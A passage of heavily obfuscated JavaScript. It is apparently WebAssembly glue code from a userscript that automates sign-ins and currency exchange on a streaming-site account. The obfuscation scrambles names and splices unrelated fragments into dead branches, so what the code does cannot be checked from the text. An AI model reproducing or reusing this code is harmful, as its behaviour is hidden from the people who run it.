_0xb153d8=_0x47ac7d[_0x44b0('3e7','\x41\x40\x71\x34')][_0x1015aa[_0x44b0('3e8','\x57\x76\x6e\x6b')](_0x12a44c+0x4+_0x1015aa[_0x44b0('3e9','\x45\x25\x78\x72')](_0x584a6f,0x8),0x4)];var _0x31e3c2=_0x47ac7d[_0x44b0('299','\x4a\x51\x76\x65')]['\x74\x6f\x5f\x6a\x73\x5f\x73\x74\x72\x69\x6e\x67'](_0x42953e,_0xb153d8);var _0x4ad390=_0x47ac7d[_0x44b0('2f9','\x30\x64\x6a\x29')]['\x74\x6f\x5f\x6a\x73'](_0x1015aa[_0x44b0('3ea','\x30\x78\x36\x55')](_0x4c4224,_0x1015aa[_0x44b0('3eb','\x66\x50\x57\x25')](_0x584a6f,0x10)));_0x690c5b[_0x31e3c2]=_0x4ad390;}continue;case'\x31':var _0x690c5b={};continue;case'\x32':var _0x12a44c=_0x34843e+_0x47ac7d['\x48\x45\x41\x50\x55\x33\x32'][_0x1015aa[_0x44b0('3ec','\x51\x25\x5d\x28')](address,0x8)/0x4];continue;case'\x33':var _0x598f7f=_0x47ac7d[_0x44b0('3ed','\x57\x4c\x32\x31')][_0x1015aa[_0x44b0('3ee','\x69\x71\x55\x67')](address+0x4,0x4)];continue;case'\x34':return _0x690c5b;case'\x35':var _0x4c4224=_0x1015aa['\x68\x64\x4b\x6e\x4f'](_0x34843e,_0x47ac7d[_0x44b0('3ef','\x5a\x55\x6a\x6c')][_0x1015aa[_0x44b0('3f0','\x52\x33\x4e\x68')](address,0x4)]);continue;case'\x36':var _0x34843e=_0x47ac7d[_0x44b0('3f1','\x2a\x52\x4c\x7a')][_0x44b0('3f2','\x29\x5e\x41\x62')];continue;}break;}}},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x38\x63\x33\x32\x30\x31\x39\x36\x34\x39\x62\x62\x35\x38\x31\x62\x31\x62\x37\x34\x32\x65\x65\x65\x64\x66\x63\x34\x31\x30\x65\x32\x62\x65\x64\x64\x35\x36\x61\x36':function(_0xa9173a,_0x474d50){if(_0x1585d3['\x57\x62\x69\x76\x70'](_0x1585d3[_0x44b0('3f3','\x4a\x51\x76\x65')],_0x1585d3[_0x44b0('3f4','\x26\x68\x52\x65')])){if(num_ongoing_calls!==0x0){drop_queued=!![];return;}output['\x64\x72\x6f\x70']=_0x47ac7d[_0x44b0('c9','\x77\x59\x64\x62')]['\x6e\x6f\x6f\x70'];var _0x226286=pointer;pointer=0x0;if(_0x226286!=0x0){_0x47ac7d[_0x44b0('27c','\x6f\x23\x56\x5b')][_0x44b0('3f5','\x47\x50\x4f\x53')]('\x76\x69',deallocator_pointer,[_0x226286]);}}else{var _0x525160=_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x44b0('3e0','\x66\x50\x57\x25')](_0xa9173a);_0x47ac7d[_0x44b0('c9','\x77\x59\x64\x62')][_0x44b0('3f6','\x52\x33\x4e\x68')](_0x474d50,_0x525160);}},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x61\x31\x65\x36\x31\x30\x37\x33\x65\x39\x62\x64\x30\x30\x36\x33\x65\x30\x34\x34\x34\x61\x38\x62\x33\x66\x38\x61\x32\x37\x37\x30\x63\x64\x66\x39\x33\x38\x65\x63':function(_0x45b4c6,_0x4d15c4){_0x4d15c4=_0x47ac7d[_0x44b0('271','\x45\x43\x35\x64')][_0x44b0('3f7','\x4b\x31\x4a\x29')](_0x4d15c4),_0x47ac7d[_0x44b0('2d7','\x6d\x4e\x33\x48')][_0x44b0('3c8','\x40\x64\x71\x6b')](_0x45b4c6,0x438);},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x61\x34\x36\x36\x61\x32\x61\x62\x39\x36\x63\x64\x37\x37\x65\x31\x61\x37\x37\x64\x63\x64\x62\x33\x39\x66\x34\x66\x30\x33\x31\x37\x30\x31\x63\x31\x39\x35\x66\x63':function(_0x5d77c5,_0x4e3d68){var _0x7f97af={'\x4e\x4a\x62\x42\x6f':function(_0x15e148,_0x19352c){return _0x1585d3[_0x44b0('3f8','\x30\x78\x36\x55')](_0x15e148,_0x19352c);},'\x45\x5a\x70\x46\x4f':function(_0x3d01b0,_0x314870){return _0x3d01b0/_0x314870;},'\x75\x59\x65\x6b\x72':function(_0xd14bf1,_0x33ff01){return _0x1585d3[_0x44b0('3f9','\x77\x59\x64\x62')](_0xd14bf1,_0x33ff01);},'\x68\x70\x46\x7a\x67':_0x1585d3[_0x44b0('3fa','\x4b\x31\x4a\x29')],'\x71\x66\x41\x68\x43':'\x35\x7c\x32\x7c\x34\x7c\x30\x7c\x33\x7c\x31'};if(_0x1585d3[_0x44b0('3fb','\x48\x6c\x29\x64')](_0x44b0('3fc','\x65\x4d\x52\x45'),_0x1585d3['\x42\x6e\x57\x50\x67'])){_0x4e3d68=_0x47ac7d[_0x44b0('23e','\x69\x6b\x5e\x48')][_0x44b0('3fd','\x46\x55\x43\x61')](_0x4e3d68),_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x44b0('3fe','\x78\x70\x51\x66')](_0x5d77c5,function(){if(_0x7f97af['\x75\x59\x65\x6b\x72'](_0x44b0('3ff','\x48\x6c\x29\x64'),_0x7f97af[_0x44b0('400','\x2a\x52\x4c\x7a')])){try{return{'\x76\x61\x6c\x75\x65':_0x4e3d68[_0x44b0('401','\x6e\x6f\x4f\x36')],'\x73\x75\x63\x63\x65\x73\x73':!0x0};}catch(_0xc5c703){return{'\x65\x72\x72\x6f\x72':_0xc5c703,'\x73\x75\x63\x63\x65\x73\x73':!0x1};}}else{var _0x4d283e=_0x47ac7d[_0x44b0('271','\x45\x43\x35\x64')][_0x44b0('402','\x45\x43\x35\x64')](value);_0x47ac7d[_0x44b0('403','\x37\x6b\x28\x50')][_0x7f97af[_0x44b0('404','\x62\x55\x70\x6a')](address,0xc)]=0xf;_0x47ac7d[_0x44b0('405','\x47\x50\x4f\x53')][_0x7f97af['\x45\x5a\x70\x46\x4f'](address,0x4)]=_0x4d283e;}}());}else{var _0x5ea978=_0x7f97af[_0x44b0('406','\x57\x4c\x32\x31')]['\x73\x70\x6c\x69\x74']('\x7c'),_0x143dd7=0x0;while(!![]){switch(_0x5ea978[_0x143dd7++]){case'\x30':this[_0x44b0('407','\x29\x5e\x41\x62')]=rsp['\x64\x61\x74\x61'][_0x44b0('408','\x4f\x73\x32\x61')];continue;case'\x31':this[_0x44b0('409','\x47\x57\x24\x42')]+=this['\x74\x69\x6d\x65'];continue;case'\x32':this['\x74\x69\x6d\x65']=rsp[_0x44b0('40a','\x73\x66\x76\x75')][_0x44b0('40b','\x29\x5e\x41\x62')];continue;case'\x33':this[_0x44b0('40c','\x50\x32\x36\x69')]=rsp[_0x44b0('40d','\x4b\x61\x72\x62')][_0x44b0('bd','\x41\x40\x71\x34')];continue;case'\x34':this['\x62\x65\x6e\x63\x68\x6d\x61\x72\x6b']=rsp['\x64\x61\x74\x61'][_0x44b0('40e','\x77\x59\x64\x62')];continue;case'\x35':++this[_0x44b0('40f','\x59\x75\x55\x68')];continue;}break;}}},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x61\x62\x30\x35\x66\x35\x33\x31\x38\x39\x64\x61\x63\x63\x63\x66\x32\x64\x33\x36\x35\x61\x64\x32\x36\x64\x61\x61\x34\x30\x37\x64\x34\x66\x37\x61\x62\x65\x61\x39':function(_0x30d849,_0x4d0537){_0x4d0537=_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x44b0('2c5','\x29\x5e\x41\x62')](_0x4d0537),_0x47ac7d[_0x44b0('233','\x4b\x61\x72\x62')]['\x66\x72\x6f\x6d\x5f\x6a\x73'](_0x30d849,_0x4d0537[_0x44b0('410','\x40\x64\x71\x6b')]);},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x62\x30\x36\x64\x64\x65\x34\x61\x63\x66\x30\x39\x34\x33\x33\x62\x35\x31\x39\x30\x61\x34\x62\x30\x30\x31\x32\x35\x39\x66\x65\x35\x64\x34\x61\x62\x63\x62\x63\x32':function(_0x5602b0,_0x2f3eae){_0x2f3eae=_0x47ac7d[_0x44b0('1d5','\x51\x25\x5d\x28')]['\x74\x6f\x5f\x6a\x73'](_0x2f3eae),_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x44b0('29e','\x26\x68\x52\x65')](_0x5602b0,_0x2f3eae[_0x44b0('411','\x6c\x76\x37\x30')]);},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x62\x33\x33\x61\x33\x39\x64\x65\x34\x63\x61\x39\x35\x34\x38\x38\x38\x65\x32\x36\x66\x65\x39\x63\x61\x61\x32\x37\x37\x31\x33\x38\x65\x38\x30\x38\x65\x65\x62\x61':function(_0x40dff4,_0x2e6e6a){_0x2e6e6a=_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x44b0('412','\x62\x55\x70\x6a')](_0x2e6e6a),_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x44b0('413','\x65\x4d\x52\x45')](_0x40dff4,_0x2e6e6a[_0x44b0('414','\x66\x50\x57\x25')]);},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x62\x36\x66\x62\x65\x31\x31\x31\x65\x34\x34\x31\x33\x33\x33\x33\x39\x38\x35\x39\x39\x66\x36\x33\x64\x63\x30\x39\x62\x32\x36\x66\x38\x64\x31\x37\x32\x36\x35\x34':function(_0x7404b6,_0x304392){var _0xaff178={'\x71\x65\x77\x68\x5a':function(_0x3ee9f9,_0x5a08e0){return _0x3ee9f9|_0x5a08e0;},'\x45\x62\x62\x4b\x4e':function(_0x37092e,_0x33202c){return _0x1585d3[_0x44b0('415','\x6e\x6f\x4f\x36')](_0x37092e,_0x33202c);},'\x71\x62\x67\x76\x50':function(_0x72f506,_0x1167ac){return _0x1585d3['\x51\x55\x6b\x64\x66'](_0x72f506,_0x1167ac);},'\x55\x75\x6a\x6f\x42':function(_0x2eb3e8,_0x4d4bbc){return _0x2eb3e8|_0x4d4bbc;},'\x64\x4f\x46\x4b\x6e':function(_0xd22e1b,_0x14e0ad){return _0x1585d3[_0x44b0('416','\x26\x68\x52\x65')](_0xd22e1b,_0x14e0ad);},'\x63\x66\x57\x4b\x41':function(_0x7a3660,_0x553c23){return _0x1585d3[_0x44b0('417','\x4b\x38\x4e\x4f')](_0x7a3660,_0x553c23);},'\x43\x4e\x68\x75\x4a':function(_0x1d4599,_0x3c4c4c){return _0x1585d3[_0x44b0('418','\x50\x32\x36\x69')](_0x1d4599,_0x3c4c4c);}};if(_0x44b0('419','\x57\x4c\x32\x31')!==_0x1585d3[_0x44b0('41a','\x4b\x31\x4a\x29')]){_0x354543[addr++]=_0xaff178[_0x44b0('41b','\x4b\x31\x4a\x29')](0xf0,_0xaff178[_0x44b0('41c','\x69\x71\x55\x67')](u,0x12));_0x354543[addr++]=0x80|_0xaff178[_0x44b0('41d','\x29\x67\x5b\x49')](_0xaff178[_0x44b0('41e','\x6c\x76\x37\x30')](u,0xc),0x3f);_0x354543[addr++]=_0xaff178[_0x44b0('41f','\x77\x35\x66\x31')](0x80,_0xaff178[_0x44b0('420','\x4f\x78\x6c\x4b')](u,0x6)&0x3f);_0x354543[addr++]=_0xaff178[_0x44b0('421','\x69\x71\x55\x67')](0x80,_0xaff178[_0x44b0('422','\x41\x40\x71\x34')](u,0x3f));}else{_0x304392=_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x44b0('423','\x73\x66\x76\x75')](_0x304392),_0x47ac7d[_0x44b0('1f8','\x6e\x6f\x4f\x36')]['\x66\x72\x6f\x6d\x5f\x6a\x73'](_0x7404b6,0x3db);}},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x63\x64\x66\x32\x38\x35\x39\x31\x35\x31\x37\x39\x31\x63\x65\x34\x63\x61\x64\x38\x30\x36\x38\x38\x62\x32\x30\x30\x35\x36\x34\x66\x62\x30\x38\x61\x38\x36\x31\x33':function(_0x33edd5,_0x5804e8){var _0x15354d={'\x66\x61\x50\x47\x6d':function(_0x3ec757){return _0x1585d3[_0x44b0('424','\x2a\x52\x4c\x7a')](_0x3ec757);},'\x69\x4c\x43\x6e\x6a':_0x1585d3['\x4d\x46\x72\x4f\x5a'],'\x72\x52\x74\x51\x71':_0x1585d3[_0x44b0('425','\x4b\x38\x4e\x4f')]};if(_0x1585d3[_0x44b0('426','\x4b\x31\x4a\x29')]('\x6b\x66\x66\x73\x42',_0x1585d3[_0x44b0('427','\x66\x50\x57\x25')])){_0x5804e8=_0x47ac7d[_0x44b0('428','\x52\x33\x4e\x68')][_0x44b0('2c5','\x29\x5e\x41\x62')](_0x5804e8),_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x44b0('429','\x4f\x73\x32\x61')](_0x33edd5,function(){try{return{'\x76\x61\x6c\x75\x65':_0x5804e8['\x68\x72\x65\x66'],'\x73\x75\x63\x63\x65\x73\x73':!0x0};}catch(_0x4bf063){if(_0x44b0('42a','\x50\x32\x36\x69')!==_0x15354d[_0x44b0('42b','\x78\x57\x72\x21')]){return{'\x65\x72\x72\x6f\x72':_0x4bf063,'\x73\x75\x63\x63\x65\x73\x73':!0x1};}else{let _0x1a3a62=this[_0x44b0('42c','\x65\x4d\x52\x45')]['\x70\x6f\x70']();if(_0x1a3a62){_0x15354d[_0x44b0('42d','\x65\x4d\x52\x45')](_0x1a3a62);}if(this['\x6c\x6f\x63\x6b\x51\x75\x65\x75\x65'][_0x44b0('42e','\x26\x68\x52\x65')]==0x0){this['\x6c\x6f\x63\x6b\x65\x64']=![];}}}}());}else{var _0x331d22=_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x44b0('42f','\x37\x6b\x28\x50')](_0x33edd5);return _0x331d22 instanceof DOMException&&_0x15354d['\x72\x52\x74\x51\x71']===_0x331d22[_0x44b0('430','\x4b\x38\x4e\x4f')];}},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x65\x38\x65\x66\x38\x37\x63\x34\x31\x64\x65\x64\x31\x63\x31\x30\x66\x38\x64\x65\x33\x63\x37\x30\x64\x65\x61\x33\x31\x61\x30\x35\x33\x65\x31\x39\x37\x34\x37\x63':function(_0x562b4b,_0x4fbc55){_0x4fbc55=_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x44b0('431','\x50\x32\x36\x69')](_0x4fbc55),_0x47ac7d[_0x44b0('3ba','\x37\x4f\x5e\x66')][_0x44b0('432','\x4f\x78\x6c\x4b')](_0x562b4b,function(){try{if(_0x1585d3[_0x44b0('433','\x73\x66\x76\x75')](_0x1585d3[_0x44b0('434','\x57\x76\x6e\x6b')],_0x1585d3[_0x44b0('435','\x57\x4c\x32\x31')])){refid=_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x6c\x61\x73\x74\x5f\x72\x65\x66\x69\x64']++;try{ref_to_id_map[_0x44b0('436','\x37\x6b\x28\x50')](reference,refid);}catch(_0x39505c){ref_to_id_map_fallback[_0x44b0('437','\x77\x59\x64\x62')](reference,refid);}}else{return{'\x76\x61\x6c\x75\x65':_0x4fbc55[_0x44b0('438','\x45\x25\x78\x72')],'\x73\x75\x63\x63\x65\x73\x73':!0x0};}}catch(_0x48f92f){if(_0x1585d3['\x57\x62\x69\x76\x70'](_0x44b0('439','\x26\x68\x52\x65'),_0x44b0('43a','\x4b\x6e\x35\x43'))){_0x4fbc55=_0x47ac7d[_0x44b0('43b','\x77\x35\x66\x31')][_0x44b0('43c','\x35\x75\x5b\x26')](_0x4fbc55),_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x66\x72\x6f\x6d\x5f\x6a\x73'](_0x562b4b,function(){try{return{'\x76\x61\x6c\x75\x65':_0x4fbc55['\x68\x6f\x73\x74'],'\x73\x75\x63\x63\x65\x73\x73':!0x0};}catch(_0x4750a1){return{'\x65\x72\x72\x6f\x72':_0x4750a1,'\x73\x75\x63\x63\x65\x73\x73':!0x1};}}());}else{return{'\x65\x72\x72\x6f\x72':_0x48f92f,'\x73\x75\x63\x63\x65\x73\x73':!0x1};}}}());},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x65\x39\x36\x33\x38\x64\x36\x34\x30\x35\x61\x62\x36\x35\x66\x37\x38\x64\x61\x66\x34\x61\x35\x61\x66\x39\x63\x39\x64\x65\x31\x34\x65\x63\x66\x31\x65\x32\x65\x63':function(_0x243107){if(_0x1585d3['\x57\x62\x69\x76\x70'](_0x1585d3['\x54\x69\x47\x74\x6d'],_0x1585d3[_0x44b0('43d','\x30\x5a\x53\x4e')])){num_ongoing_calls+=0x1;_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x64\x79\x6e\x63\x61\x6c\x6c'](_0x1585d3['\x7a\x41\x67\x67\x4e'],adapter_pointer,[function_pointer,args]);_0x47ac7d[_0x44b0('2f9','\x30\x64\x6a\x29')][_0x44b0('43e','\x39\x7a\x62\x29')]=null;var _0x37969f=_0x47ac7d[_0x44b0('43f','\x4f\x73\x32\x61')][_0x44b0('440','\x30\x5a\x53\x4e')];}else{_0x243107=_0x47ac7d[_0x44b0('248','\x78\x57\x72\x21')][_0x44b0('441','\x37\x4f\x5e\x66')](_0x243107),_0x47ac7d[_0x44b0('299','\x4a\x51\x76\x65')]['\x75\x6e\x72\x65\x67\x69\x73\x74\x65\x72\x5f\x72\x61\x77\x5f\x76\x61\x6c\x75\x65'](_0x243107);}},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x65\x61\x36\x61\x64\x39\x64\x38\x34\x31\x35\x65\x38\x34\x31\x31\x39\x36\x32\x31\x66\x35\x61\x61\x32\x63\x38\x36\x61\x33\x39\x61\x62\x63\x35\x38\x38\x62\x37\x35':function(_0x29dc62,_0x194073){var _0x5433a7={'\x54\x66\x6c\x4f\x58':function(_0x4fc0d4,_0x52bd2e){return _0x4fc0d4/_0x52bd2e;},'\x41\x48\x6c\x65\x41':function(_0x693de6,_0x1b63c2){return _0x693de6+_0x1b63c2;}};if(_0x1585d3[_0x44b0('442','\x69\x71\x55\x67')](_0x44b0('443','\x26\x68\x52\x65'),_0x1585d3['\x70\x76\x76\x47\x53'])){var _0x3e9d4f='\x31\x7c\x30\x7c\x32\x7c\x34\x7c\x33'[_0x44b0('1c8','\x6e\x6f\x4f\x36')]('\x7c'),_0x642710=0x0;while(!![]){switch(_0x3e9d4f[_0x642710++]){case'\x30':var _0x2c7293=_0x47ac7d[_0x44b0('3ed','\x57\x4c\x32\x31')][_0x5433a7['\x54\x66\x6c\x4f\x58'](address+0x4,0x4)];continue;case'\x31':var _0x2a9ca1=_0x47ac7d[_0x44b0('444','\x4a\x51\x76\x65')][address/0x4];continue;case'\x32':var _0x25b3c7=_0x47ac7d[_0x44b0('445','\x37\x4f\x5e\x66')][_0x5433a7[_0x44b0('446','\x48\x6c\x29\x64')](_0x5433a7[_0x44b0('447','\x30\x5a\x53\x4e')](address,0x8),0x4)];continue;case'\x33':switch(_0x25b3c7){case 0x0:return _0x47ac7d[_0x44b0('448','\x6e\x6f\x4f\x36')][_0x44b0('25b','\x59\x75\x55\x68')](_0x2a9ca1,_0x5116ee);case 0x1:return _0x47ac7d[_0x44b0('449','\x77\x35\x66\x31')][_0x44b0('44a','\x6c\x76\x37\x30')](_0x2a9ca1,_0x5116ee);case 0x2:return _0x47ac7d[_0x44b0('44b','\x37\x4f\x5e\x66')][_0x44b0('44c','\x57\x4c\x32\x31')](_0x2a9ca1,_0x5116ee);case 0x3:return _0x47ac7d[_0x44b0('44d','\x78\x70\x51\x66')][_0x44b0('44e','\x78\x57\x72\x21')](_0x2a9ca1,_0x5116ee);case 0x4:return _0x47ac7d[_0x44b0('445','\x37\x4f\x5e\x66')][_0x44b0('44f','\x50\x32\x36\x69')](_0x2a9ca1,_0x5116ee);case 0x5:return _0x47ac7d[_0x44b0('450','\x59\x75\x55\x68')][_0x44b0('451','\x37\x6b\x28\x50')](_0x2a9ca1,_0x5116ee);case 0x6:return _0x47ac7d['\x48\x45\x41\x50\x46\x33\x32'][_0x44b0('44e','\x78\x57\x72\x21')](_0x2a9ca1,_0x5116ee);case 0x7:return _0x47ac7d[_0x44b0('452','\x30\x64\x6a\x29')][_0x44b0('25f','\x52\x33\x4e\x68')](_0x2a9ca1,_0x5116ee);}continue;case'\x34':var _0x5116ee=_0x5433a7[_0x44b0('453','\x4b\x38\x4e\x4f')](_0x2a9ca1,_0x2c7293);continue;}break;}}else{_0x194073=_0x47ac7d[_0x44b0('117','\x69\x71\x55\x67')][_0x44b0('454','\x58\x47\x44\x4e')](_0x194073),_0x47ac7d[_0x44b0('455','\x35\x75\x5b\x26')][_0x44b0('456','\x37\x4f\x5e\x66')](_0x29dc62,0x248);}},'\x5f\x5f\x63\x61\x72\x67\x6f\x5f\x77\x65\x62\x5f\x73\x6e\x69\x70\x70\x65\x74\x5f\x66\x66\x35\x31\x30\x33\x65\x36\x63\x63\x31\x37\x39\x64\x31\x33\x62\x34\x63\x37\x61\x37\x38\x35\x62\x64\x63\x65\x32\x37\x30\x38\x66\x64\x35\x35\x39\x66\x63\x30':function(_0x40d598){_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x44b0('457','\x5a\x55\x6a\x6c')]=_0x47ac7d[_0x44b0('1d5','\x51\x25\x5d\x28')]['\x74\x6f\x5f\x6a\x73'](_0x40d598);},'\x5f\x5f\x77\x65\x62\x5f\x6f\x6e\x5f\x67\x72\x6f\x77':_0x4f69f2}},'\x69\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65':function(_0x1e0354){var _0x56704f={'\x66\x66\x75\x44\x51':_0x1585d3['\x49\x6b\x79\x5a\x52'],'\x64\x41\x49\x44\x4e':_0x1585d3[_0x44b0('458','\x78\x70\x51\x66')],'\x6c\x53\x57\x5a\x58':function(_0x2fbe7d){return _0x2fbe7d();},'\x42\x4c\x42\x43\x50':_0x1585d3[_0x44b0('459','\x62\x55\x70\x6a')],'\x68\x57\x48\x76\x47':_0x1585d3[_0x44b0('45a','\x37\x6b\x28\x50')]};if(_0x1585d3['\x4a\x4d\x4b\x62\x56'](_0x1585d3[_0x44b0('45b','\x62\x55\x70\x6a')],'\x76\x67\x5a\x58\x69')){return _0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x44b0('45c','\x73\x66\x76\x75')](_0x47ac7d[_0x44b0('277','\x35\x75\x5b\x26')][address/0x4]);}else{Object[_0x44b0('45d','\x40\x64\x71\x6b')](_0x47ac7d,_0x44b0('45e','\x37\x6b\x28\x50'),{'\x76\x61\x6c\x75\x65':_0x1e0354});Object[_0x44b0('45f','\x78\x57\x72\x21')](_0x47ac7d,_0x1585d3[_0x44b0('460','\x39\x7a\x62\x29')],{'\x76\x61\x6c\x75\x65':_0x47ac7d[_0x44b0('461','\x57\x76\x6e\x6b')]['\x65\x78\x70\x6f\x72\x74\x73'][_0x44b0('462','\x48\x6c\x29\x64')]});Object[_0x44b0('463','\x35\x75\x5b\x26')](_0x47ac7d,_0x1585d3[_0x44b0('464','\x73\x66\x76\x75')],{'\x76\x61\x6c\x75\x65':_0x47ac7d[_0x44b0('465','\x2a\x52\x4c\x7a')][_0x44b0('385','\x69\x71\x55\x67')]['\x5f\x5f\x77\x65\x62\x5f\x66\x72\x65\x65']});Object[_0x44b0('466','\x77\x35\x66\x31')](_0x47ac7d,_0x1585d3['\x71\x43\x70\x4c\x64'],{'\x76\x61\x6c\x75\x65':_0x47ac7d[_0x44b0('467','\x62\x55\x70\x6a')][_0x44b0('468','\x69\x6b\x5e\x48')][_0x44b0('469','\x6f\x23\x56\x5b')]});_0x47ac7d[_0x44b0('46a','\x4b\x38\x4e\x4f')][_0x44b0('46b','\x6f\x23\x56\x5b')]=function(_0x11580e,_0x484218){if(_0x1585d3[_0x44b0('46c','\x2a\x52\x4c\x7a')]!==_0x44b0('46d','\x35\x75\x5b\x26')){try{if(_0x1585d3[_0x44b0('46e','\x45\x25\x78\x72')](_0x1585d3[_0x44b0('46f','\x45\x43\x35\x64')],_0x1585d3['\x65\x74\x42\x52\x76'])){var _0x50a553=_0x47ac7d[_0x44b0('26f','\x73\x66\x76\x75')][_0x44b0('470','\x77\x35\x66\x31')](_0x47ac7d[_0x44b0('471','\x45\x25\x78\x72')]['\x65\x78\x70\x6f\x72\x74\x73'][_0x44b0('472','\x58\x47\x44\x4e')](_0x47ac7d['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x44b0('473','\x69\x71\x55\x67')](_0x11580e),_0x47ac7d[_0x44b0('24d','\x4b\x6e\x35\x43')][_0x44b0('474','\x29\x67\x5b\x49')](_0x484218)));return _0x50a553;}else{try{return{'\x76\x61\x6c\x75\x65':_0x484218[_0x44b0('475','\x51\x25\x5d\x28')],'\x73\x75\x63\x63\x65\x73\x73':!0x0};}catch(_0x7f9390){return{'\x65\x72\x72\x6f\x72':_0x7f9390,'\x73\x75\x63\x63\x65\x73\x73':!0x1};}}}catch(_0x303cb1){console[_0x44b0('476','\x66\x50\x57\x25')](_0x1585d3[_0x44b0('477','\x5a\x55\x6a\x6c')],_0x303cb1);}}else{var _0x10933f=_0x56704f[_0x44b0('478','\x77\x35\x66\x31')][_0x44b0('479','\x78\x57\x72\x21')]('\x7c'),_0x567050=0x0;while(!![]){switch(_0x10933f[_0x567050++]){case'\x30':_0x47ac7d[_0x44b0('47a','\x73\x66\x76\x75')][_0x44b0('47b','\x2a\x52\x4c\x7a')]=function(_0x47663d,_0x3b93f5){try{var _0x1c5842=_0x47ac7d[_0x44b0('26f','\x73\x66\x76\x75')][_0x44b0('47c','\x4a\x51\x76\x65')](_0x47ac7d['\x69\x6e\x73\x74\x61\x6e\x63\x65']['\x65\x78\x70\x6f\x72\x74\x73'][_0x44b0('47d','\x59\x75\x55\x68')](_0x47ac7d[_0x44b0('47e','\x4f\x78\x6c\x4b')][_0x44b0('47f','\x40\x64\x71\x6b')](_0x47663d),_0x47ac7d[_0x44b0('329','\x57\x4c\x32\x31')][_0x44b0('480','\x37\x4f\x5e\x66')](_0x3b93f5)));return _0x1c5842;}catch(_0x27499b){console['\x6c\x6f\x67']('\x65\x72\x72\x6f\x72',_0x27499b);}};continue;case'\x31':Object['\x64\x65\x66\x69\x6e\x65\x50\x72\x6f\x70\x65\x72\x74\x79'](_0x47ac7d,_0x56704f['\x64\x41\x49\x44\x4e'],{'\x76\x61\x6c\x75\x65':_0x1e0354});continue;case'\x32':_0x56704f[_0x44b0('481','\x37\x6b\x28\x50')](_0x4f69f2);continue;case'\x33':Object['\x64\x65\x66\x69\x6e\x65\x50\x72\x6f\x70\x65\x72\x74\x79'](_0x47ac7d,_0x44b0('482','\x45\x25\x78\x72'),{'\x76\x61\x6c\x75\x65':_0x47ac7d[_0x44b0('483','\x73\x66\x76\x75')][_0x44b0('484','\x41\x40\x71\x34')][_0x44b0('485','\x73\x66\x76\x75')]});continue;case'\x34':Object['\x64\x65\x66\x69\x6e\x65\x50\x72\x6f\x70\x65\x72\x74\x79'](_0x47ac7d,_0x56704f[_0x44b0('486','\x26\x68\x52\x65')],{'\x76\x61\x6c\x75\x65':_0x47ac7d[_0x44b0('487','\x4b\x31\x4a\x29')]['\x65\x78\x70\x6f\x72\x74\x73'][_0x44b0('488','\x4b\x31\x4a\x29')]});continue;case'\x35':return _0x47ac7d[_0x44b0('46a','\x4b\x38\x4e\x4f')];case'\x36':Object[_0x44b0('489','\x62\x55\x70\x6a')](_0x47ac7d,_0x56704f[_0x44b0('48a','\x69\x6b\x5e\x48')],{'\x76\x61\x6c\x75\x65':_0x47ac7d[_0x44b0('48b','\x30\x78\x36\x55')][_0x44b0('48c','\x40\x64\x71\x6b')][_0x44b0('48d','\x65\x4d\x52\x45')]});continue;}break;}}};_0x1585d3[_0x44b0('48e','\x51\x25\x5d\x28')](_0x4f69f2);return _0x47ac7d[_0x44b0('48f','\x30\x78\x36\x55')];}}};}};;_0xodx='jsjiami.com.v6';

        const Run = async () => {
            //await TokenLoad();
            // 每天一次
            Statistics.run();
            if (CONFIG.AUTO_SIGN) Sign.run();
            if (CONFIG.SILVER2COIN) Exchange.run();
